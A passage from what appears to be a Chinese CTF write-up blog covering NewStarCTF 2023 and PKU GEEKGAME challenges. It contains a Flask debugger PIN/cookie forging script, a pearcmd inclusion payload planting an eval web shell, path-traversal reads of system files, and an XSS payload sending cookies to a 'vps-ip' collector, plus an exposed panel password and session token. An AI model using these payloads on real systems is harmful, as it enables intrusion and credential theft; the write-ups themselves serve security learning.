class="hljs-title function_">welcome</span>():<br>    <span class="hljs-keyword">if</span> session[<span class="hljs-string">&quot;islogin&quot;</span>] == <span class="hljs-literal">True</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;flag&#123;***********************&#125;&quot;</span><br><br><br>app.run(<span class="hljs-string">&#x27;0.0.0.0&#x27;</span>, <span class="hljs-number">1314</span>, debug=<span class="hljs-literal">True</span>)<span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><p>有个提示<code>#from NeepuF1Le import neepu_files</code>，就搜了一下，结果搜到出题人打NeepuCTF的题解了</p><p>感觉就是根据NeepuCTF的Cute Cirno改编的，有异曲同工之妙，但是就算SSRF了1314端口也拿不到真的flag（</p><p>所以应该是要算pin码了，趁着这个时机好好学一下算pin码</p><blockquote><ul><li><ol><li>username，用户名(&#x2F;etc&#x2F;passwd里面找（（太草了)</li></ol></li><li><ol start="2"><li>modname，默认值为flask.app</li></ol></li><li><ol start="3"><li>appname，默认值为Flask</li></ol></li><li><ol start="4"><li>moddir，flask库下app.py的绝对路径（报错好搞</li></ol></li><li><ol start="5"><li>uuidnode，当前网络的mac地址的十进制数（&#x2F;sys&#x2F;class&#x2F;net&#x2F;eth0&#x2F;address）</li></ol></li><li><ol start="6"><li><p>machine_id，docker机器id（如果是docker靶机的话</p><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs swift"><span class="hljs-regexp">/etc/</span>machine<span class="hljs-operator">-</span>id`或者`<span class="hljs-regexp">/proc/</span>sys<span class="hljs-regexp">/kernel/</span>random<span class="hljs-regexp">/boot_id`其中一个拼接上`/</span>proc<span class="hljs-regexp">/self/</span>cgroup<br></code></pre></td></tr></table></figure></li></ol></li></ul></blockquote><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs ruby"><span class="hljs-symbol">root:</span><span class="hljs-symbol">x:</span><span class="hljs-number">0</span><span class="hljs-symbol">:</span><span class="hljs-number">0</span><span class="hljs-symbol">:root</span><span class="hljs-symbol">:/root</span><span class="hljs-symbol">:/bin/bash</span><br><span class="hljs-symbol">daemon:</span><span class="hljs-symbol">x:</span><span class="hljs-number">1</span><span class="hljs-symbol">:</span><span class="hljs-number">1</span><span class="hljs-symbol">:daemon</span><span class="hljs-symbol">:/usr/sbin</span><span class="hljs-symbol">:/usr/sbin/nologin</span><br><span class="hljs-symbol">bin:</span><span class="hljs-symbol">x:</span><span class="hljs-number">2</span><span class="hljs-symbol">:</span><span class="hljs-number">2</span><span class="hljs-symbol">:bin</span><span class="hljs-symbol">:/bin</span><span class="hljs-symbol">:/usr/sbin/nologin</span><br><span class="hljs-symbol">sys:</span><span class="hljs-symbol">x:</span><span class="hljs-number">3</span><span class="hljs-symbol">:</span><span class="hljs-number">3</span><span class="hljs-symbol">:sys</span><span class="hljs-symbol">:/dev</span><span class="hljs-symbol">:/usr/sbin/nologin</span><br><span class="hljs-symbol">sync:</span><span class="hljs-symbol">x:</span><span class="hljs-number">4</span><span class="hljs-symbol">:</span><span class="hljs-number">65534</span><span class="hljs-symbol">:sync</span><span class="hljs-symbol">:/bin</span><span class="hljs-symbol">:/bin/sync</span><br><span class="hljs-symbol">games:</span><span class="hljs-symbol">x:</span><span class="hljs-number">5</span><span class="hljs-symbol">:</span><span class="hljs-number">60</span><span class="hljs-symbol">:games</span><span class="hljs-symbol">:/usr/games</span><span class="hljs-symbol">:/usr/sbin/nologin</span><br><span class="hljs-symbol">man:</span><span class="hljs-symbol">x:</span><span class="hljs-number">6</span><span class="hljs-symbol">:</span><span class="hljs-number">12</span><span class="hljs-symbol">:man</span><span class="hljs-symbol">:/var/cache/man</span><span class="hljs-symbol">:/usr/sbin/nologin</span><br><span class="hljs-symbol">lp:</span><span class="hljs-symbol">x:</span><span class="hljs-number">7</span><span class="hljs-symbol">:</span><span class="hljs-number">7</span><span class="hljs-symbol">:lp</span><span class="hljs-symbol">:/var/spool/lpd</span><span class="hljs-symbol">:/usr/sbin/nologin</span><br><span class="hljs-symbol">mail:</span><span class="hljs-symbol">x:</span><span class="hljs-number">8</span><span class="hljs-symbol">:</span><span class="hljs-number">8</span><span class="hljs-symbol">:mail</span><span class="hljs-symbol">:/var/mail</span><span class="hljs-symbol">:/usr/sbin/nologin</span><br><span class="hljs-symbol">news:</span><span class="hljs-symbol">x:</span><span class="hljs-number">9</span><span class="hljs-symbol">:</span><span class="hljs-number">9</span><span class="hljs-symbol">:news</span><span class="hljs-symbol">:/var/spool/news</span><span class="hljs-symbol">:/usr/sbin/nologin</span><br><span class="hljs-symbol">uucp:</span><span class="hljs-symbol">x:</span><span class="hljs-number">10</span><span class="hljs-symbol">:</span><span class="hljs-number">10</span><span class="hljs-symbol">:uucp</span><span class="hljs-symbol">:/var/spool/uucp</span><span class="hljs-symbol">:/usr/sbin/nologin</span><br><span class="hljs-symbol">proxy:</span><span class="hljs-symbol">x:</span><span class="hljs-number">13</span><span class="hljs-symbol">:</span><span class="hljs-number">13</span><span class="hljs-symbol">:proxy</span><span class="hljs-symbol">:/bin</span><span class="hljs-symbol">:/usr/sbin/nologin</span><br>www-<span class="hljs-symbol">data:</span><span class="hljs-symbol">x:</span><span class="hljs-number">33</span><span class="hljs-symbol">:</span><span class="hljs-number">33</span><span class="hljs-symbol">:www-data</span><span class="hljs-symbol">:/var/www</span><span class="hljs-symbol">:/usr/sbin/nologin</span><br><span class="hljs-symbol">backup:</span><span class="hljs-symbol">x:</span><span class="hljs-number">34</span><span class="hljs-symbol">:</span><span class="hljs-number">34</span><span class="hljs-symbol">:backup</span><span class="hljs-symbol">:/var/backups</span><span class="hljs-symbol">:/usr/sbin/nologin</span><br><span class="hljs-symbol">list:</span><span class="hljs-symbol">x:</span><span class="hljs-number">38</span><span class="hljs-symbol">:</span><span class="hljs-number">38</span><span class="hljs-symbol">:Mailing</span> <span class="hljs-title class_">List</span> <span class="hljs-title class_">Manager</span><span class="hljs-symbol">:/var/list</span><span class="hljs-symbol">:/usr/sbin/nologin</span><br><span class="hljs-symbol">irc:</span><span class="hljs-symbol">x:</span><span class="hljs-number">39</span><span class="hljs-symbol">:</span><span class="hljs-number">39</span><span class="hljs-symbol">:ircd</span><span class="hljs-symbol">:/run/ircd</span><span class="hljs-symbol">:/usr/sbin/nologin</span><br><span class="hljs-symbol">gnats:</span><span class="hljs-symbol">x:</span><span class="hljs-number">41</span><span class="hljs-symbol">:</span><span class="hljs-number">41</span><span class="hljs-symbol">:Gnats</span> <span class="hljs-title class_">Bug</span>-<span class="hljs-title class_">Reporting</span> <span class="hljs-title class_">System</span> (admin)<span class="hljs-symbol">:/var/lib/gnats</span><span class="hljs-symbol">:/usr/sbin/nologin</span><br><span class="hljs-symbol">nobody:</span><span class="hljs-symbol">x:</span><span class="hljs-number">65534</span><span class="hljs-symbol">:</span><span class="hljs-number">65534</span><span class="hljs-symbol">:nobody</span><span class="hljs-symbol">:/nonexistent</span><span class="hljs-symbol">:/usr/sbin/nologin</span><br><span class="hljs-symbol">_apt:</span><span class="hljs-symbol">x:</span><span class="hljs-number">100</span><span class="hljs-symbol">:</span><span class="hljs-number">65534</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:/nonexistent</span><span class="hljs-symbol">:/usr/sbin/nologin</span><br><br>/usr/local/lib/python3.<span class="hljs-number">10</span>/dist-packages/flask/app.py<br><br>/sys/<span class="hljs-keyword">class</span>/net/eth0/address<br><span class="hljs-symbol">ea:</span><span class="hljs-number">77</span><span class="hljs-symbol">:</span><span class="hljs-number">05</span><span class="hljs-symbol">:</span><span class="hljs-number">58</span><span class="hljs-symbol">:af</span><span class="hljs-symbol">:</span>2f-&gt;ea770558af2f-&gt;<span class="hljs-number">257796911705903</span><br><br>/<span class="hljs-built_in">proc</span>/sys/kernel/random/boot_id<br>8cab9c97-85be-4fb4-9d17-29335d7b2b8a<br><br>/<span class="hljs-built_in">proc</span>/<span class="hljs-variable language_">self</span>/cgroup<br>aaf831f68f4d63d20b2aa0cf361710787006861f59aff5c33aa21641dde24948<br><br>s<br>li0Abbstc8jO5ov16OhS<br></code></pre></td></tr></table></figure><p>照着脚本倒是可以算了，但是因为是<code>php的curl</code>，所以只能用爬取数据，但是无论如何先用POST试一下把</p><p>POST也不行，我的username试了root和www-data来着，总不可能是username的问题把，感觉就是没法访问的问题（（</p><p>瞪不出来，遂看题解，题解也当谜语人，有点绷不住，于是参考了<code>z1d10t</code>的题解</p><blockquote><p><a href="https://z1d10t.fun/post/dcc8a51b.html#WEEK5">https://z1d10t.fun/post/dcc8a51b.html#WEEK5</a></p></blockquote><p>原来是<code>/proc/self/cgroup</code>获取的内容和往常算pin码的题不一样，受教了，正确解如下</p><p><strong><code>取第一行的最后一个斜杠/后面的所有字符串</code>那么肯定是对的</strong></p><p>然后由于console不出网，所以没法通过浏览器直接进入控制台，这个时候需要手算cookie，具体参考如下</p><blockquote><p><a href="https://unk.icu/2023/06/19/flask-pin/">https://unk.icu/2023/06/19/flask-pin/</a></p></blockquote><p>无法直接进入控制台的情况下，对于发送验证pin码的请求有格式上的要求，最重要的就是s，然而这个是可以直接读的，好像还有个frm参数，但是好像是无所谓的（（（如果需要直接访问报错页面在html源码里就能找到</p><p>格式大概如下</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">GET /?__debugger__=yes&amp;cmd=pinauth&amp;pin=xxx-xxx-xxx&amp;s=prj74Iraob1k5eMHiH37<br></code></pre></td></tr></table></figure><p>若auth成功，还会带一个cookie：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">Set-Cookie: __wzdaba192b254d6aa653a27=1687143761|fd1c004c3dc3; HttpOnly; Path=/; SameSite=Strict<br></code></pre></td></tr></table></figure><p>之后执行命令的请求，要带上面发过来的cookie，否则不执行命令：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">GET /?&amp;__debugger__=yes&amp;cmd=print(1)&amp;frm=140324285712640&amp;s=prj74Iraob1k5eMHiH37<br>Cookie: __wzdaba192b254d6aa653a27<br></code></pre></td></tr></table></figure><p>手算cookie的话，直接见全脚本吧（z1d10t佬的题解还可以用gopher发包读到set的cookie值</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> hashlib<br><span class="hljs-keyword">import</span> time<br><span class="hljs-keyword">from</span> itertools <span class="hljs-keyword">import</span> chain<br><br>probably_public_bits = [<br>    <span class="hljs-string">&#x27;root&#x27;</span>  <span class="hljs-comment"># /etc/passwd</span><br>    <span class="hljs-string">&#x27;flask.app&#x27;</span>,  <span class="hljs-comment"># 默认值</span><br>    <span class="hljs-string">&#x27;Flask&#x27;</span>,  <span class="hljs-comment"># 默认值</span><br>    <span class="hljs-string">&#x27;/usr/local/lib/python3.10/dist-packages/flask/app.py&#x27;</span>  <span class="hljs-comment"># 报错得到</span><br>]<br><br>private_bits = [<br>    <span class="hljs-string">&#x27;16476878681546&#x27;</span>,  <span class="hljs-comment"># /sys/class/net/eth0/address 16进制转10进制</span><br>    <span class="hljs-comment"># machine_id由三个合并(docker就后两个)：1./etc/machine-id 2./proc/sys/kernel/random/boot_id 3./proc/self/cgroup</span><br>    <span class="hljs-string">&#x27;&#x27;</span><br>    <span class="hljs-comment"># /proc/self/cgroup</span><br>]<br><br>h = hashlib.sha1()<br><span class="hljs-keyword">for</span> bit <span class="hljs-keyword">in</span> chain(probably_public_bits, private_bits):<br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> bit:<br>        <span class="hljs-keyword">continue</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">isinstance</span>(bit, <span class="hljs-built_in">str</span>):<br>        bit = bit.encode(<span class="hljs-string">&#x27;utf-8&#x27;</span>)<br>    h.update(bit)<br>h.update(<span class="hljs-string">b&#x27;cookiesalt&#x27;</span>)<br><br>cookie_name = <span class="hljs-string">&#x27;__wzd&#x27;</span> + h.hexdigest()[:<span class="hljs-number">20</span>]<br><br>num = <span class="hljs-literal">None</span><br><span class="hljs-keyword">if</span> num <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:<br>    h.update(<span class="hljs-string">b&#x27;pinsalt&#x27;</span>)<br>    num = (<span class="hljs-string">&#x27;%09d&#x27;</span> % <span class="hljs-built_in">int</span>(h.hexdigest(), <span class="hljs-number">16</span>))[:<span class="hljs-number">9</span>]<br><br>rv = <span class="hljs-literal">None</span><br><span class="hljs-keyword">if</span> rv <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:<br>    <span class="hljs-keyword">for</span> group_size <span class="hljs-keyword">in</span> <span class="hljs-number">5</span>, <span class="hljs-number">4</span>, <span class="hljs-number">3</span>:<br>        <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(num) % group_size == <span class="hljs-number">0</span>:<br>            rv = <span class="hljs-string">&#x27;-&#x27;</span>.join(num[x:x + group_size].rjust(group_size, <span class="hljs-string">&#x27;0&#x27;</span>)<br>                          <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-built_in">len</span>(num), group_size))<br>            <span class="hljs-keyword">break</span><br>    <span class="hljs-keyword">else</span>:<br>        rv = num<br><br><span class="hljs-comment">#hash_pin作为手算cookie的一部分</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">hash_pin</span>(<span class="hljs-params">pin: <span class="hljs-built_in">str</span></span>) -&gt; <span class="hljs-built_in">str</span>: <span class="hljs-keyword">return</span> hashlib.sha1(<span class="hljs-string">f&quot;<span class="hljs-subst">&#123;pin&#125;</span> added salt&quot;</span>.encode(<span class="hljs-string">&quot;utf-8&quot;</span>, <span class="hljs-string">&quot;replace&quot;</span>)).hexdigest()[:<span class="hljs-number">12</span>] <br><br><br><span class="hljs-built_in">print</span>(rv)<br><span class="hljs-comment">#手算cookie的第二部分</span><br><span class="hljs-built_in">print</span>(cookie_name + <span class="hljs-string">&quot;=&quot;</span> + <span class="hljs-string">f&quot;<span class="hljs-subst">&#123;<span class="hljs-built_in">int</span>(time.time())&#125;</span>|<span class="hljs-subst">&#123;hash_pin(rv)&#125;</span>&quot;</span>)<br></code></pre></td></tr></table></figure><p>用Postman发包好使（（（复现成功了，注意传参不能有空格，也不是%20，而是%2B&#x3D;’+’（加号-0_0-</p><p>————————————————————————————————————————————————————————————</p><h3 id="4-复盘"><a href="#4-复盘" class="headerlink" title="4-复盘"></a>4-复盘</h3><p>文件一多我就寄，慌了神，其实这是一道很简单的联想题，但是我又被迷惑了双眼，审代码审的昏天黑地也没把握到本质，最后只能玉玉</p><p>玉玉之后就只能看题解，结果只是简单的文件包含，要调用<code>pearcmd</code>的话并不一定是<code>include</code>，像<code>file_exist</code>这样的也是同理的</p><p>就是要想到有装pearcmd这个插件有点难度，而且还是一句老话，用burp传（（，直接在地址栏传也直接寄</p><figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs groovy"><span class="hljs-regexp">/index.php?+config-create+/</span>&amp;page=<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>usr<span class="hljs-regexp">/local/</span>lib<span class="hljs-regexp">/php/</span>pearcmd&amp;<span class="hljs-regexp">/&lt;?=@eval($_POST[1])?&gt;+/</span><span class="hljs-keyword">var</span><span class="hljs-regexp">/www/</span>html/<span class="hljs-number">1.</span>php<br></code></pre></td></tr></table></figure><p>多套几层<code>../</code>，套多了不会怎么样，套少了就读不到了（（（，然后蚁剑连接SUID提权，比赛结束后靠经典命令就读不到了，原因未知</p><p>然后就是<code>gzip</code>提权，博客也就不引了，可以自己搜索一下</p><p>————————————————————————————————————————————————————————————</p><h3 id="NextDrive"><a href="#NextDrive" class="headerlink" title="NextDrive"></a>NextDrive</h3><p>一道神秘题，主要看你有没有好奇心，我的好奇心自然是早就被磨灭了（，看到文件也不下载，只想着摆烂看题解了</p><p>（也有可能是最后一题的因素在把，想赶紧干完去搞别的了┭┮﹏┭┮</p><p>总之就是先随便注册一个账号，下载共享区里的<code>test.res.http</code>，然后呢你可以试着自己上传一个文件，发现它分两次请求，第一次只需要一个hash值和一个文件名就能完成，第二次才是真正的传输文件数据，然后就是考眼力的时候</p><p>在<code>test.res.http</code>里面有一个请求没发送出去，（坑，名字叫做<code>test.req.http</code>，所以有理由推断我们可以伪造发送这个请求，然后就能直接拿到这个文件的数据（此点可以随便试着伪造一个共享区的文件上传，发现不需要第二次传输</p><p>拿到数据之后是<code>admin</code>的用户凭据，直接修改uid和token就能admin上号了，上号之后可以观察本地资源，可疑的就是<code>share.js</code></p><p>一通审之后，发现有些函数调用的是<code>hash_fn</code>，有些调用的则是<code>hash</code>，而且<code>path.resolve</code>会强行忽略不重要的path路径名使之尽可能有效，那么我们就有理由实现一个目录穿越了，因为<code>hash是hash_fn的前64位</code>所以说64位以后的我们就能伪造成我们想要的路径了</p><p>可以测试一下<code>../../../../etc/passwd</code>或者也可以直接<code>../../../../../proc/self/environ</code>，记住得用linux的curl来发包，</p><p>windows的curl应该是不行的，bp没试过（有兴趣的可以尝试一下</p><p>然后读环境变量的话要加<code>--out filename</code>参数把读到的二进制文件保存在一个指定的文件里</p><p>————————————————————————————————————————————————————————————</p><p>至此我的NewstarCTF2023的征程算是告一段落了，有学到很多东西，我要是能牢牢记住的话应该会很不错，后三周题目质量对于我这样的初学者来说真的挺好的，感谢各位出题师傅，也感谢没有放弃的我自己<code>^_^</code></p>]]></content>
    
    
    
    <tags>
      
      <tag>CTF</tag>
      
      <tag>writeup</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>PKU GEEKGAME Writeup</title>
    <link href="/2023/11/13/PKU%20GEEKGAME/"/>
    <url>/2023/11/13/PKU%20GEEKGAME/</url>
    
    <content type="html"><![CDATA[<h1 id="PKU-GEEKGAME"><a href="#PKU-GEEKGAME" class="headerlink" title="PKU GEEKGAME"></a>PKU GEEKGAME</h1><h2 id="1-第三新XSS"><a href="#1-第三新XSS" class="headerlink" title="1.第三新XSS"></a>1.第三新XSS</h2><p>首先要和内网交互，所以公网应该是少不了的，这次嫖华为云去了（）</p><p>一开始我用nginx搭了个默认页面，但是解析不了php（即访问php文件就自动下载源文件），配环境难如登天，纯用JS也要appendChild什么的，再者还有还有限制，在后面细说</p><p>后来我就尝试nc监听，让网页发送GET请求，但是document.cookie一直读的是空，就算用XSS Bot执行payload也是读的空，我就有点没太搞明白，查了查资料，问了问chatgpt说是有这几种可能</p><p>1.HttpOnly&#x3D;True</p><p>2.Secure Cookie</p><p>3.不同域读取？（</p><p>4.SameSite（这个是真没听过）<br>结合了下题干，红字是<strong>所有人共享一个网站</strong>，所以可能是SameSite？？？</p><p>总之在纯净nginx碰壁之后，我把纯净centOS换成宝塔了，还是懒人适合我（</p><blockquote><p>外网面板地址: <a href="https://121.36.15.50:18059/c8f3f7ae">https://121.36.15.50:18059/c8f3f7ae</a><br> 内网面板地址: <a href="https://192.168.0.249:18059/c8f3f7ae">https://192.168.0.249:18059/c8f3f7ae</a><br> username: ihij0ih3<br> password: 95c36d63</p></blockquote><p>上面这个是秘密（到时候给删了，做题先留着</p><p>希望宝塔的打包环境能来点作用，最近CTF比赛有点多，我好想实践一下docker，但是老是没有时间</p><p>background knowledge:</p><p><strong>cookie的SameSite属性</strong></p><p>1.Strict      完全禁止第三方Cookie，跨站点时，任何情况都不会发送Cookie</p><p>2.Lax         少数情况发送第三方Cookie，详见下图</p><p>3.None        始终发送第三方Cookie</p><p>用宝塔也试了一下document.cookie，果然还是不行</p><p>我看StackOverflow上说读不到就是HttpOnly，应该不是SameSite的问题了</p><p>————————————————分割线——————————————————</p><p>唉，有点想缴械投降了，确实脑洞不够大，很多东西都是一知半解，或者说是根本不懂</p><p>javascript也没想象中那么了解，更有新的typescript，XSS也是根本一点也不懂</p><p>给我的挫败感有点强了，虽然其实我自己确实是懒，脚本不想写，总想着小聪明</p><p>唉，什么时候才能改掉这个不爱写脚本的坏习惯呢，我连怎么http发送请求都还不熟悉</p><p>唉，唉，唉</p><p><strong>第二阶段咯，有hint了我终于不用坐牢啦哈哈哈</strong></p><p><strong>好玩好玩，好玩好玩，好玩好玩，好玩好玩，好玩好玩，太好玩啦哈哈哈哈哈哈</strong></p><p><strong>Level 1</strong></p><blockquote><p>参考MCN:</p><p><a href="https://developer.mozilla.org/en-US/docs/web/api/document/cookie#security">https://developer.mozilla.org/en-US/docs/web/api/document/cookie#security</a></p><p>参考blog:</p><p><a href="https://juejin.cn/post/7127916577684471845">https://juejin.cn/post/7127916577684471845</a></p></blockquote><p>咳咳，回归正题，XSS.py里原来设置了Cookie的path，导致不同目录不能读到Cookie，</p><p>得用iframe+contentDocument.cookie，因为iframe算是独立的一个窗口，与另一个目录通信</p><p>注意一点，得先iframe.onload&#x3D;function(){  }，才能读到iframe里的数据</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-attr">payload</span>:<br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">iframe</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;http://prob99-ch243r4h.geekgame.pku.edu.cn/admin&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">iframe</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="language-javascript"><span class="language-xml"><span class="hljs-keyword">var</span> iframe = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementsByTagName</span>(<span class="hljs-string">&#x27;iframe&#x27;</span>)[<span class="hljs-number">0</span>];</span></span><br><span class="language-javascript"><span class="language-xml">iframe.<span class="hljs-property">onload</span>=<span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)&#123;</span></span><br><span class="language-javascript"><span class="language-xml"><span class="hljs-variable language_">document</span>.<span class="hljs-title function_">write</span>(<span class="hljs-string">&#x27;&lt;img src=&quot;http://vps-ip/getcookie.php?cookie=&#x27;</span>+iframe.<span class="hljs-property">contentDocument</span>.<span class="hljs-property">cookie</span>+<span class="hljs-string">&#x27;&quot;width=0 height=0&gt;&#x27;</span>);</span></span><br><span class="language-javascript"><span class="language-xml">&#125;</span></span><br><span class="language-javascript"><span class="language-xml"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span><br></code></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php">getcookie.php:<br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$cookie</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;cookie&#x27;</span>];<br><span class="hljs-variable">$ip</span> = <span class="hljs-title function_ invoke__">getenv</span> (<span class="hljs-string">&#x27;REMOTE_ADDR&#x27;</span>);<br><span class="hljs-variable">$time</span> = <span class="hljs-title function_ invoke__">date</span>(<span class="hljs-string">&#x27;Y-m-d g:i:s&#x27;</span>);<br><span class="hljs-variable">$fp</span> = <span class="hljs-title function_ invoke__">fopen</span>(<span class="hljs-string">&quot;cookie.txt&quot;</span>,<span class="hljs-string">&quot;a&quot;</span>);<br><span class="hljs-title function_ invoke__">fwrite</span>(<span class="hljs-variable">$fp</span>,<span class="hljs-string">&quot;IP: &quot;</span>.<span class="hljs-variable">$ip</span>.<span class="hljs-string">&quot;Date: &quot;</span>.<span class="hljs-variable">$time</span>.<span class="hljs-string">&quot; Cookie:&quot;</span>.<span class="hljs-variable">$cookie</span>.<span class="hljs-string">&quot;\n&quot;</span>);<br><span class="hljs-title function_ invoke__">fclose</span>(<span class="hljs-variable">$fp</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>如果没有vps的话，修改当前目录下的<strong>title</strong>应该也是可以的</p><p><strong>Level 2</strong></p><p>…未完待续</p><h2 id="2-Emoji-Wordle"><a href="#2-Emoji-Wordle" class="headerlink" title="2.Emoji Wordle"></a>2.Emoji Wordle</h2><p>顾名思义，就是emoji外国猜字谜，先介绍一下规则</p><p>输入n个emoji符号，会返回n个三种颜色的方块</p><p>1.若返回红色方块，说明对应位置的emoji不存在于答案中</p><p>2.若返回黄色方块，说明对应位置的emoji在答案中，但是位置错误</p><p>3.若返回绿色方块，说明对应位置的emoji在答案中，且位置正确</p><p><strong>Level 1</strong></p><p>简单看了下源码，改了results和localStorage，发现无果，说明没有检查这些鸟玩意</p><p>把Cookie拿去解析了下，就只有level和时间戳，改level无果，时间戳干嘛用不知道（</p><p>题目说答案是固定的，所以就直接爆破了，以下是python源码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> re<br><br>url = <span class="hljs-string">&quot;https://prob14.geekgame.pku.edu.cn/level3?&quot;</span><br>headers=&#123;<br>    <span class="hljs-string">&#x27;User-Agent&#x27;</span>:<span class="hljs-string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36&quot;</span><br>&#125;<br>param = &#123;<br>    <span class="hljs-string">&#x27;guess&#x27;</span>: <span class="hljs-string">&quot;?123&quot;</span><br>&#125;<br>cookie_d=&#123;<br>    <span class="hljs-string">&#x27;PLAY_SESSION&#x27;</span>:<span class="hljs-string">&quot;eyJhbGciOiJIUzI1NiJ9.eyJkYXRhIjp7ImxldmVsIjoiMyIsInN0YXJ0X3RpbWUiOiIxNjk3NjI3MzAyNjc5IiwicmVtYWluaW5nX2d1ZXNzZXMiOiIyIiwic2VlZCI6IjEuMjQ2MTQ1ODQxMjk2MzFFMTIifSwibmJmIjoxNjk3NjI3MzA3LCJpYXQiOjE2OTc2MjczMDd9.eMLRy1PQPp-kkJUaWVz_bDk5CkGcM_D8DIqOqB_TGcM&quot;</span><br>&#125;<br>res = requests.get(url=url,params=param, headers=headers,cookies=cookie_d)<br>res.encoding = <span class="hljs-string">&quot;utf-8&quot;</span><br>text = res.text<br>pattern=<span class="hljs-string">r&#x27;&lt;input name=guess 